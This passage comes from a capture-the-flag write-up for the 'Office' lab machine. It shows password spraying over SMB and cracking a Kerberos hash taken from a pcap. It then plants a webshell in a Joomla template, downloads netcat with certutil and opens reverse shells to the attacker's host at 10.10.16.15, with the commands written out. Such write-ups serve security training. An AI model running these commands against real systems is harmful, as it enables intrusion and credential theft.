</span></span></span><span class=line><span class=cl><span class=go>2024/05/20 22:00:30 &gt;  [+] VALID USERNAME:       etower@office.htb
</span></span></span><span class=line><span class=cl><span class=go>2024/05/20 22:00:30 &gt;  [+] VALID USERNAME:       ewhite@office.htb
</span></span></span><span class=line><span class=cl><span class=go>2024/05/20 22:00:30 &gt;  [+] VALID USERNAME:       dwolfe@office.htb
</span></span></span><span class=line><span class=cl><span class=go>2024/05/20 22:00:30 &gt;  [+] VALID USERNAME:       dmichael@office.htb
</span></span></span><span class=line><span class=cl><span class=go>2024/05/20 22:00:30 &gt;  [+] VALID USERNAME:       dlanor@office.htb
</span></span></span><span class=line><span class=cl><span class=go>2024/05/20 22:08:50 &gt;  [+] VALID USERNAME:       hhogan@office.htb
</span></span></span></code></pre></div><p>I save all these potential users in a file called <code>users.txt</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>❯ cat users.txt
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>administrator
</span></span></span><span class=line><span class=cl><span class=go>Administrator
</span></span></span><span class=line><span class=cl><span class=go>etower
</span></span></span><span class=line><span class=cl><span class=go>ewhite
</span></span></span><span class=line><span class=cl><span class=go>dwolfe
</span></span></span><span class=line><span class=cl><span class=go>dmichael
</span></span></span><span class=line><span class=cl><span class=go>dlanor
</span></span></span><span class=line><span class=cl><span class=go>hhogan
</span></span></span></code></pre></div><p>And, now, use again <code>NetExec</code> to check if these credentials works on <code>SMB</code> service:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>❯ netexec smb 10.10.11.3 -u users.txt -p &#39;H0lOgrams4reTakIng0Ver754!&#39; --continue-on-success
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>SMB         10.10.11.3      445    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:office.htb) (signing:True) (SMBv1:False)
</span></span></span><span class=line><span class=cl><span class=go>SMB         10.10.11.3      445    DC               [-] office.htb\administrator:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE
</span></span></span><span class=line><span class=cl><span class=go>SMB         10.10.11.3      445    DC               [-] office.htb\Administrator:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE
</span></span></span><span class=line><span class=cl><span class=go>SMB         10.10.11.3      445    DC               [-] office.htb\etower:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE
</span></span></span><span class=line><span class=cl><span class=go>SMB         10.10.11.3      445    DC               [-] office.htb\ewhite:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE
</span></span></span><span class=line><span class=cl><span class=go>SMB         10.10.11.3      445    DC               [+] office.htb\dwolfe:H0lOgrams4reTakIng0Ver754!
</span></span></span><span class=line><span class=cl><span class=go>SMB         10.10.11.3      445    DC               [-] office.htb\dmichael:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE
</span></span></span><span class=line><span class=cl><span class=go>SMB         10.10.11.3      445    DC               [-] office.htb\dlanor:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE
</span></span></span><span class=line><span class=cl><span class=go>SMB         10.10.11.3      445    DC               [-] office.htb\hhogan:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE
</span></span></span></code></pre></div><p>where we have valid credentials for <code>SMB</code> service: <code>dwolfe:H0lOgrams4reTakIng0Ver754!</code></p><p>Checking the shares for this user with <code>smbmap</code> we have a share called &ldquo;SOC Analyst&rdquo;. Checking this share shows a <code>.pcap</code> file:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>❯ smbmap -H 10.10.11.3 --no-banner -u &#39;dwolfe&#39; -p &#39;H0lOgrams4reTakIng0Ver754!&#39; -r &#39;SOC Analysis&#39;
</span></span></span><span class=line><span class=cl><span class=go>[*] Detected 1 hosts serving SMB
</span></span></span><span class=line><span class=cl><span class=go>[*] Established 1 SMB session(s)
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[+] IP: 10.10.11.3:445  Name: 10.10.11.3                Status: Authenticated
</span></span></span><span class=line><span class=cl><span class=go>        Disk                                                    Permissions     Comment
</span></span></span><span class=line><span class=cl><span class=go>        ----                                                    -----------     -------
</span></span></span><span class=line><span class=cl><span class=go>        ADMIN$                                                  NO ACCESS       Remote Admin
</span></span></span><span class=line><span class=cl><span class=go>        C$                                                      NO ACCESS       Default share
</span></span></span><span class=line><span class=cl><span class=go>        IPC$                                                    READ ONLY       Remote IPC
</span></span></span><span class=line><span class=cl><span class=go>        NETLOGON                                                READ ONLY       Logon server share
</span></span></span><span class=line><span class=cl><span class=go>        SOC Analysis                                            READ ONLY
</span></span></span><span class=line><span class=cl><span class=go>        ./SOC Analysis
</span></span></span><span class=line><span class=cl><span class=go>        dr--r--r--                0 Wed May 10 14:52:24 2023    .
</span></span></span><span class=line><span class=cl><span class=go>        dr--r--r--                0 Wed Feb 14 07:18:31 2024    ..
</span></span></span><span class=line><span class=cl><span class=go>        fr--r--r--          1372860 Wed May 10 14:51:42 2023    Latest-System-Dump-8fbc124d.pcap
</span></span></span><span class=line><span class=cl><span class=go>        SYSVOL                                                  READ ONLY       Logon server share
</span></span></span></code></pre></div><p>We download this file:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>❯ smbmap -H 10.10.11.3 --no-banner -u &#39;dwolfe&#39; -p &#39;H0lOgrams4reTakIng0Ver754!&#39; --download &#39;SOC Analysis\Latest-System-Dump-8fbc124d.pcap&#39;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[*] Detected 1 hosts serving SMB
</span></span></span><span class=line><span class=cl><span class=go>[*] Established 1 SMB session(s)
</span></span></span><span class=line><span class=cl><span class=go>[+] Starting download: SOC Analysis\Latest-System-Dump-8fbc124d.pcap (1372860 bytes)
</span></span></span><span class=line><span class=cl><span class=go>[+] File output to: /home/gunzf0x/HTB/HTBMachines/Hard/Office/content/10.10.11.3-SOC Analysis_Latest-System-Dump-8fbc124d.pcap
</span></span></span></code></pre></div><p>Now, the share name &ldquo;SOC Analysis&rdquo; and the <code>.pcap</code> extension is a hint that we could read this file using a traffic analysis tool like <code>Wireshark</code>. We open <code>Wireshark</code>, and open the downloaded <code>.pcap</code> file. Analyzing this file, at packet number <code>1917</code> we can see a <code>KRB5</code> protocol request:</p><p><img alt="Office 3" src=/pentesting/images/Office_3.png></p><p><a href=https://medium.com/@robert.broeckelmann/kerberos-wireshark-captures-a-windows-login-example-151fabf3375a class=external-link target=_blank rel=noopener>This blog</a> explains how to get a hash from an intercepted package with <code>Wireshark</code>. If we double click on the packet we can see an emergent window similar to:</p><p><img alt="Office 4" src=/pentesting/images/Office_4.png></p><p>Now we can click on the arrow next to <code>Kerberos</code>. So basically click on <code>Kerberos -> as-req -> pdata -> PA-DATA -> padata-type -> padata-value</code></p><p><img alt="Office 5" src=/pentesting/images/Office_5.png></p><p>Based on the steps from the blog, the important items here are <code>etype</code> that indicates the hash type, and <code>cipher</code> that indicates the hash. The other important parameter is located at <code>req-body -> cname -> cname-string -> CNameString</code> is <code>tstark</code> that is the username. Based on this, we can &ldquo;build&rdquo; the hash:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>$krb5pa$18$tstark$OFFICE.HTB$a16f4806da05760af63c566d566f071c5bb35d0a414459417613a9d67932a6735704d0832767af226aaa7360338a34746a00a3765386f5fc
</span></span></code></pre></div><p>I save this hash in a file called <code>tstark_hash</code></p><p>We can try a <code>Brute Force Password Cracking</code> for this hash using <code>Hashcat</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>❯ hashcat -m 19900 tstark_hash /usr/share/wordlists/rockyou.txt -O
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>hashcat (v6.2.6) starting
</span></span></span><span class=line><span class=cl><span class=go>&lt;SNIP&gt;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=gp>$</span>krb5pa<span class=nv>$18$tstark$OFFICE</span>.HTB<span class=nv>$a16f4806da05760af63c566d566f071c5bb35d0a414459417613a9d67932a6735704d0832767af226aaa7360338a34746a00a3765386f5fc</span>:playboy69
</span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>&lt;SNIP&gt;
</span></span></span></code></pre></div><p>so we have a user and a password: <code>tstark:playboy69</code> (nice).</p><p>These credentials work for <code>SMB</code> service, but <code>tstark</code> user does not have any interesting shares:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>❯ netexec smb 10.10.11.3 -u tstark -p &#39;playboy69&#39; --shares
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>SMB         10.10.11.3      445    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:office.htb) (signing:True) (SMBv1:False)
</span></span></span><span class=line><span class=cl><span class=go>SMB         10.10.11.3      445    DC               [+] office.htb\tstark:playboy69
</span></span></span><span class=line><span class=cl><span class=go>SMB         10.10.11.3      445    DC               [*] Enumerated shares
</span></span></span><span class=line><span class=cl><span class=go>SMB         10.10.11.3      445    DC               Share           Permissions     Remark
</span></span></span><span class=line><span class=cl><span class=go>SMB         10.10.11.3      445    DC               -----           -----------     ------
</span></span></span><span class=line><span class=cl><span class=go>SMB         10.10.11.3      445    DC               ADMIN$                          Remote Admin
</span></span></span><span class=line><span class=cl><span class=go>SMB         10.10.11.3      445    DC               C$                              Default share
</span></span></span><span class=line><span class=cl><span class=go>SMB         10.10.11.3      445    DC               IPC$            READ            Remote IPC
</span></span></span><span class=line><span class=cl><span class=go>SMB         10.10.11.3      445    DC               NETLOGON        READ            Logon server share
</span></span></span><span class=line><span class=cl><span class=go>SMB         10.10.11.3      445    DC               SOC Analysis
</span></span></span><span class=line><span class=cl><span class=go>SMB         10.10.11.3      445    DC               SYSVOL          READ            Logon server share
</span></span></span></code></pre></div><p>Now that I have another password I decide to go back to <code>Joomla</code> login page (<code>http://10.10.11.3/administrator/</code>) and try to log in with these new credentials. But they still do not work. However, after trying some users with the same password, the credentials <code>administrator:playboy69</code> work and we are inside <code>Joomla</code> panel:</p><p><img alt="Office 6" src=/pentesting/images/Office_6.png></p><p>Now, we can go to <code>System</code>, locate the <code>Templates</code> section and click on <code>Site Templates</code>. We can then see something like:</p><p><img alt="Office 7" src=/pentesting/images/Office_7.png></p><p>We can click on <code>Cassiopeia Details and Files</code>, and then at the left side click on <code>error.php</code>. Here I replace all the <code>PHP</code> code, by the code inside <code>shell.php</code> from <a href=https://github.com/flozz/p0wny-shell/blob/master/shell.php class=external-link target=_blank rel=noopener>p0wny-shell</a> since we are against a <code>Windows</code> machine:</p><p><img alt="Office 8" src=/pentesting/images/Office_8.png></p><p>and now, from the same session from the internet browser we are logged in, we can visit <code>http://10.10.11.3/templates/cassiopeia/error.php</code> and our webshell is there:
<img alt="Office 9" src=/pentesting/images/Office_9.png></p><p>where we have a shell as <code>office\web_account</code>.</p><p><div class="notice note"><div class=notice-title><i class="fa-solid fa-sticky-note" aria-hidden=true></i>Note</div><div class=notice-content>There is some script running that constantly cleans and restores <code>error.php</code> file. So we might have to repeat these steps and constantly re-upload the webshell.</div></div>However, I prefer an interactive shell rather than a webshell. So I will pass a <code>netcat</code> binary for <code>Windows</code> after starting a temporal <code>Python</code> <code>HTTP</code> server on port <code>8080</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>❯ ls &amp;&amp; python3 -m http.server 8080
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>CVE-2023-23752  nc64.exe
</span></span></span></code></pre></div><p>And in the uploaded webshell we download the binary using <code>certutil</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>web_account@DC:C:\xampp\htdocs\joomla\templates\cassiopeia# certutil.exe -urlcache -split -f http://10.10.16.15:8080/nc64.exe C:\Users\Public\Downloads\nc.exe
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>****  Online  ****
</span></span></span><span class=line><span class=cl><span class=go>  0000  ...
</span></span></span><span class=line><span class=cl><span class=go>  b0d8
</span></span></span><span class=line><span class=cl><span class=go>CertUtil: -URLCache command completed successfully.
</span></span></span></code></pre></div><p>I start a <code>netcat</code> listener on port <code>443</code>. We then run the downloaded binary in the webshell:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>web_account@DC:C:\xampp\htdocs\joomla\templates\cassiopeia# C:\Users\Public\Downloads\nc.exe 10.10.16.15 443 -e C:\Windows\System32\cmd.exe
</span></span></span></code></pre></div><p>and I get a shell:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>❯ rlwrap -cAr nc -lvnp 443
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>listening on [any] 443 ...
</span></span></span><span class=line><span class=cl><span class=go>connect to [10.10.16.15] from (UNKNOWN) [10.10.11.3] 59664
</span></span></span><span class=line><span class=cl><span class=go>Microsoft Windows [Version 10.0.20348.2322]
</span></span></span><span class=line><span class=cl><span class=go>(c) Microsoft Corporation. All rights reserved.
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>C:\xampp\htdocs\joomla\templates\cassiopeia&gt;whoami
</span></span></span><span class=line><span class=cl><span class=go>whoami
</span></span></span><span class=line><span class=cl><span class=go>office\web_account
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>C:\xampp\htdocs\joomla\templates\cassiopeia&gt;
</span></span></span></code></pre></div><p>However, the flag is not at <code>web_account</code> Desktop.</p><p>I remember that the password <code>playboy69</code> (nice) was valid for the user <code>tstark</code> in <code>SMB</code> service. This user exists in the machine:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>C:\xampp\htdocs\joomla\templates\cassiopeia&gt;dir C:\Users
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>dir C:\Users
</span></span></span><span class=line><span class=cl><span class=go> Volume in drive C has no label.
</span></span></span><span class=line><span class=cl><span class=go> Volume Serial Number is C626-9388
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go> Directory of C:\Users
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>01/17/2024  11:50 AM    &lt;DIR&gt;          .
</span></span></span><span class=line><span class=cl><span class=go>01/22/2024  10:22 AM    &lt;DIR&gt;          Administrator
</span></span></span><span class=line><span class=cl><span class=go>01/18/2024  01:24 PM    &lt;DIR&gt;          HHogan
</span></span></span><span class=line><span class=cl><span class=go>01/22/2024  10:22 AM    &lt;DIR&gt;          PPotts
</span></span></span><span class=line><span class=cl><span class=go>01/18/2024  01:29 PM    &lt;DIR&gt;          Public
</span></span></span><span class=line><span class=cl><span class=go>01/18/2024  11:33 AM    &lt;DIR&gt;          tstark
</span></span></span><span class=line><span class=cl><span class=go>01/22/2024  10:22 AM    &lt;DIR&gt;          web_account
</span></span></span><span class=line><span class=cl><span class=go>               0 File(s)              0 bytes
</span></span></span><span class=line><span class=cl><span class=go>               7 Dir(s)   4,995,842,048 bytes free
</span></span></span></code></pre></div><p>However, we cannot log in with this user via <code>Windows Remote Management</code> (<code>WinRM</code>) or <code>SMB</code> since this is not a privileged user:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>C:\xampp\htdocs\joomla\templates\cassiopeia&gt;net user tstark
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>net user tstark
</span></span></span><span class=line><span class=cl><span class=go>User name                    tstark
</span></span></span><span class=line><span class=cl><span class=go>Full Name
</span></span></span><span class=line><span class=cl><span class=go>Comment
</span></span></span><span class=line><span class=cl><span class=go>User&#39;s comment
</span></span></span><span class=line><span class=cl><span class=go>Country/region code          000 (System Default)
</span></span></span><span class=line><span class=cl><span class=go>Account active               Yes
</span></span></span><span class=line><span class=cl><span class=go>Account expires              Never
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Password last set            5/8/2023 6:32:00 PM
</span></span></span><span class=line><span class=cl><span class=go>Password expires             Never
</span></span></span><span class=line><span class=cl><span class=go>Password changeable          5/9/2023 6:32:00 PM
</span></span></span><span class=line><span class=cl><span class=go>Password required            Yes
</span></span></span><span class=line><span class=cl><span class=go>User may change password     Yes
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Workstations allowed         All
</span></span></span><span class=line><span class=cl><span class=go>Logon script
</span></span></span><span class=line><span class=cl><span class=go>User profile
</span></span></span><span class=line><span class=cl><span class=go>Home directory
</span></span></span><span class=line><span class=cl><span class=go>Last logon                   1/18/2024 12:46:28 PM
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Logon hours allowed          All
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Local Group Memberships
</span></span></span><span class=line><span class=cl><span class=go>Global Group memberships     *Domain Users         *Registry Editors
</span></span></span><span class=line><span class=cl><span class=go>The command completed successfully.
</span></span></span></code></pre></div><p>So I will upload <code>RunasCs</code> (which can be downloaded from <a href=https://github.com/antonioCoco/RunasCs/releases/tag/v1.5 class=external-link target=_blank rel=noopener>its Github repository</a>), and pass it to the machine similar as we have passed <code>netcat</code> binary. Once the file has been transferred, run it to send us another reverse shell, but this time as the user <code>tstark</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>C:\Users\Public\Downloads&gt;.\runascs.exe tstark playboy69 &#39;C:\Users\Public\Downloads\nc.exe 10.10.16.15 443 -e C:\Windows\System32\cmd.exe&#39; -t 10 --bypass-uac
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>.\runascs.exe tstark playboy69 &#39;C:\Users\Public\Downloads\nc.exe 10.10.16.15 443 -e C:\Windows\System32\cmd.exe&#39; -t 10 --bypass-uac
</span></span></span><span class=line><span class=cl><span class=go>[-] RunasCsException: [!] Failed to set the token&#39;s Integrity Level: High
</span></span></span></code></pre></div><p>but this throws an error. So I run as an alternative:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>.\runascs.exe tstark playboy69 cmd.exe -r 10.10.16.15:443
</span></span></span><span class=line><span class=cl><span class=go>[*] Warning: The logon for user &#39;tstark&#39; is limited. Use the flag combination --bypass-uac and --logon-type &#39;8&#39; to obtain a more privileged token.
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[+] Running in session 0 with process function CreateProcessWithLogonW()
</span></span></span><span class=line><span class=cl><span class=go>[+] Using Station\Desktop: Service-0x0-a4f7e$\Default
</span></span></span><span class=line><span class=cl><span class=go>[+] Async process &#39;C:\Windows\system32\cmd.exe&#39; with pid 7684 created in background.
</span></span></span></code></pre></div><p>and get a shell as <code>tstark</code> user:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>❯ rlwrap -cAr nc -lvnp 443
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>listening on [any] 443 ...
</span></span></span><span class=line><span class=cl><span class=go>connect to [10.10.16.15] from (UNKNOWN) [10.10.11.3] 59786
</span></span></span><span class=line><span class=cl><span class=go>Microsoft Windows [Version 10.0.20348.2322]
</span></span></span><span class=line><span class=cl><span class=go>(c) Microsoft Corporation. All rights reserved.
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>C:\Windows\system32&gt;whoami
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>whoami
</span></span></span><span class=line><span class=cl><span class=go>office\tstark
</span></span></span></code></pre></div><p>where we can finally get the user flag at <code>tstark</code> user Desktop</p><hr><h2 id=nt-authoritysystem---administrator>NT Authority/System - Administrator
<a class=heading-link href=#nt-authoritysystem---administrator><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h2><p>If we check internal ports open:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>C:\Windows\system32&gt;netstat -an | find &#34;LISTEN&#34;
</span></span></span><span class=line><span class=cl><span class=go>netstat -an | find &#34;LISTEN&#34;
</span></span></span><span class=line><span class=cl><span class=go>  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING
</span></span></span><span class=line><span class=cl><span class=go>  TCP    0.0.0.0:88             0.0.0.0:0              LISTENING
</span></span></span><span class=line><span class=cl><span class=go>  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING
</span></span></span><span class=line><span class=cl><span class=go>  TCP    0.0.0.0:389            0.0.0.0:0              LISTENING
</span></span></span><span class=line><span class=cl><span class=go>  TCP    0.0.0.0:443            0.0.0.0:0              LISTENING
</span></span></span><span class=line><span class=cl><span class=go>  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING
</span></span></span><span class=line><span class=cl><span class=go>  TCP    0.0.0.0:464            0.0.0.0:0              LISTENING
</span></span></span><span class=line><span class=cl><span class=go>  TCP    0.0.0.0:593            0.0.0.0:0              LISTENING
</span></span></span><span class=line><span class=cl><span class=go>  TCP    0.0.0.0:636            0.0.0.0:0              LISTENING
</span></span></span><span class=line><span class=cl><span class=go>  TCP    0.0.0.0:3268           0.0.0.0:0              LISTENING
</span></span></span><span class=line><span class=cl><span class=go>  TCP    0.0.0.0:3269           0.0.0.0:0              LISTENING
</span></span></span><span class=line><span class=cl><span class=go>  TCP    0.0.0.0:3306           0.0.0.0:0              LISTENING
</span></span></span><span class=line><span class=cl><span class=go>  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING
</span></span></span><span class=line><span class=cl><span class=go>  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING
</span></span></span><span class=line><span class=cl><span class=go>  TCP    0.0.0.0:8083           0.0.0.0:0              LISTENING
</span></span></span><span class=line><span class=cl><span class=go>  TCP    0.0.0.0:9389           0.0.0.0:0              LISTENING
</span></span></span><span class=line><span class=cl><span class=go>  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING
</span></span></span><span class=line><span class=cl><span class=go>  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING
</span></span></span><span class=line><span class=cl><span class=go>  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING
</span></span></span><span class=line><span class=cl><span class=go>  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING
</span></span></span><span class=line><span class=cl><span class=go>  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING
</span></span></span><span class=line><span class=cl><span class=go>  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING
</span></span></span><span class=line><span class=cl><span class=go>  TCP    0.0.0.0:49669          0.0.0.0:0              LISTENING
</span></span></span><span class=line><span class=cl><span class=go>  TCP    0.0.0.0:49675          0.0.0.0:0              LISTENING
</span></span></span><span class=line><span class=cl><span class=go>  TCP    0.0.0.0:49680          0.0.0.0:0              LISTENING
</span></span></span><span class=line><span class=cl><span class=go>  TCP    0.0.0.0:49683          0.0.0.0:0              LISTENING
</span></span></span><span class=line><span class=cl><span class=go>  TCP    0.0.0.0:51987          0.0.0.0:0              LISTENING
</span></span></span><span class=line><span class=cl><span class=go>  TCP    0.0.0.0:58523          0.0.0.0:0              LISTENING
</span></span></span><span class=line><span class=cl><span class=go>  TCP    10.10.11.3:53          0.0.0.0:0              LISTENING
</span></span></span><span class=line><span class=cl><span class=go>  TCP    10.10.11.3:139         0.0.0.0:0              LISTENING
</span></span></span><span class=line><span class=cl><span class=go>  TCP    127.0.0.1:53           0.0.0.0:0              LISTENING
</span></span></span><span class=line><span class=cl><span class=go>  TCP    [::]:80                [::]:0                 LISTENING
</span></span></span><span class=line><span class=cl><span class=go>  TCP    [::]:88                [::]:0                 LISTENING
</span></span></span><span class=line><span class=cl><span class=go>  TCP    [::]:135               [::]:0                 LISTENING
</span></span></span><span class=line><span class=cl><span class=go>  TCP    [::]:443               [::]:0                 LISTENING
</span></span></span><span class=line><span class=cl><span class=go>  TCP    [::]:445               [::]:0                 LISTENING
</span></span></span><span class=line><span class=cl><span class=go>  TCP    [::]:464               [::]:0                 LISTENING
</span></span></span><span class=line><span class=cl><span class=go>  TCP    [::]:593               [::]:0                 LISTENING
</span></span></span><span class=line><span class=cl><span class=go>  TCP    [::]:3306              [::]:0                 LISTENING
</span></span></span><span class=line><span class=cl><span class=go>  TCP    [::]:3389              [::]:0                 LISTENING
</span></span></span><span class=line><span class=cl><span class=go>  TCP    [::]:5985              [::]:0                 LISTENING
</span></span></span><span class=line><span class=cl><span class=go>  TCP    [::]:8083              [::]:0                 LISTENING
</span></span></span><span class=line><span class=cl><span class=go>  TCP    [::]:9389              [::]:0                 LISTENING
</span></span></span><span class=line><span class=cl><span class=go>  TCP    [::]:47001             [::]:0                 LISTENING
</span></span></span><span class=line><span class=cl><span class=go>  TCP    [::]:49664             [::]:0                 LISTENING
</span></span></span><span class=line><span class=cl><span class=go>  TCP    [::]:49665             [::]:0                 LISTENING
</span></span></span><span class=line><span class=cl><span class=go>  TCP    [::]:49666             [::]:0                 LISTENING
</span></span></span><span class=line><span class=cl><span class=go>  TCP    [::]:49667             [::]:0                 LISTENING
</span></span></span><span class=line><span class=cl><span class=go>  TCP    [::]:49668             [::]:0                 LISTENING
</span></span></span><span class=line><span class=cl><span class=go>  TCP    [::]:49669             [::]:0                 LISTENING
</span></span></span><span class=line><span class=cl><span class=go>  TCP    [::]:49675             [::]:0                 LISTENING
</span></span></span><span class=line><span class=cl><span class=go>  TCP    [::]:49680             [::]:0                 LISTENING
</span></span></span><span class=line><span class=cl><span class=go>  TCP    [::]:49683             [::]:0                 LISTENING
</span></span></span><span class=line><span class=cl><span class=go>  TCP    [::]:51987             [::]:0                 LISTENING
</span></span></span><span class=line><span class=cl><span class=go>  TCP    [::]:58523             [::]:0                 LISTENING
</span></span></span><span class=line><span class=cl><span class=go>  TCP    [::1]:53               [::]:0                 LISTENING
</span></span></span></code></pre></div><p>We have a lot.</p><p>If we filter by the ports found by <code>Nmap</code> to check for new ports:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>C:\Windows\system32&gt;netstat -an | findstr /i &#34;listening&#34; | findstr /v /r &#34;:88&#34; | findstr /v /r &#34;:53&#34; | findstr /v /r &#34;:389&#34; | findstr /v /r &#34;:443&#34; | findstr /v /r &#34;:445&#34; | findstr /v /r &#34;:593&#34; | findstr /v /r &#34;:139&#34; | findstr /v /r &#34;:464&#34; | findstr /v /r &#34;:636&#34; | findstr /v /r &#34;:3268&#34; | findstr /v /r &#34;:3269&#34; | findstr /v /r &#34;:5985&#34; | findstr /v /r &#34;:9389&#34; | findstr /v /r &#34;:49664&#34; | findstr /v /r &#34;:49669&#34; | findstr /v /r &#34;:49675&#34; | findstr /v /r &#34;:49680&#34; | findstr /v /r &#34;:51987&#34;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING
</span></span></span><span class=line><span class=cl><span class=go>  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING
</span></span></span><span class=line><span class=cl><span class=go>  TCP    0.0.0.0:3306           0.0.0.0:0              LISTENING
</span></span></span><span class=line><span class=cl><span class=go>  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING
</span></span></span><span class=line><span class=cl><span class=go>  TCP    0.0.0.0:8083           0.0.0.0:0              LISTENING
</span></span></span><span class=line><span class=cl><span class=go>  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING
</span></span></span><span class=line><span class=cl><span class=go>  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING
</span></span></span><span class=line><span class=cl><span class=go>  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING
